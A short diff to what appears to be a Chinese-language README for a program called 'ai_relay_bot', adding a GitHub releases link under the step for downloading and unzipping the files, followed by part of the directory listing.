@@ -6,6 +6,8 @@
 
 # 1. 下载文件并解压缩
 
+https://github.com/fliykoa9-sketch/public/releases
+
 # 2. 文件目录结构
 
 - `ai_relay_bot` - 主程序入口
